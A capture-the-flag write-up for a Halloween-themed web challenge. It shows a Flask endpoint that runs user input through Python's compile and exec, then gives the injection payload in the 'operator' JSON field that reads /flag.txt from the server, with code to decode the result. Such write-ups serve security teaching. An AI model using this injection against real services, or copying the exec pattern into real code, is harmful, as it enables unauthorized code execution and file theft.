# Evaluation Deck

## Challenge Description

> A powerful demon has sent one of his ghost generals into our world to ruin the fun of Halloween. The ghost can only be defeated by luck. Are you lucky enough to draw the right cards to defeat him and save this Halloween?


## Solution
We are given the source code for the website, after reading some of the code, I found an API that features an interesting method which supposedly calculates the health of the ghost (in the website) from the given paramaters.

```python
@api.route('/get_health', methods=['POST'])
def count():
    if not request.is_json:
        return response('Invalid JSON!'), 400

    data = request.get_json()

    current_health = data.get('current_health')
    attack_power = data.get('attack_power')
    operator = data.get('operator')
    
    if not current_health or not attack_power or not operator:
        return response('All fields are required!'), 400

    result = {}
    try:
        code = compile(f'result = {int(current_health)} {operator} {int(attack_power)}', '<string>', 'exec')
        exec(code, result)
        return response(result.get('result'))
    except:
        return response('Something Went Wrong!'), 500
```

However, they are using Python's `compile` and `exec` function, which can be very dangerous when executed from unsanitized user input.

We can control all the paramters, but `current_health` and `attack_power` are converted to int and that limits us to pass only numbers (otherwise the program on the server will just crash).

That leaves us with `operator` that needs to be added to two numbers.
So I tried to find a way to encrypt the flag into a number which can then be decrypted into the flag itself.

I ended up converting the flag to bytes and then to int - using the following line of code:

```python
flag = 'HTB{f4k3_fl4g_f0r_t3st1ng}'
flag_bytes = flag.encode('utf-8') 
flag_int = int.from_bytes(flag_bytes, 'little')

# flag_int = 201516498940107249491797512894218632304837388393313697999770696
```
`flag_bytes` can be simplified to `flag_bytes = open('/flag.txt', 'rb').read()`

this number can now be added to the other two variables, so the final payload to be sent as a POST reqeust using Postman:

```json
{
    "current_health": 50,
    "attack_power": 50,
    "operator": "+ int.from_bytes(open('/flag.txt', 'rb').read(), 'little') +"
}
```

The result I got was `56597642921265698821522452374355843011427354479177954040810850297494445905068`.

Now because the flag int was added to `50` from both sides, we need to substract a total of `100` from the result (
    ```56597642921265698821522452374355843011427354479177954040810850297494445905068 - 100 = 56597642921265698821522452374355843011427354479177954040810850297494445904968```
    ).

To decode the number we just need to convert back from int to bytes:
```python
result.to_bytes((result.bit_length() + 7) // 8, 'little')

# b'HTB{c0d3_1nj3ct10ns_4r3_Gr3at!!}'
```




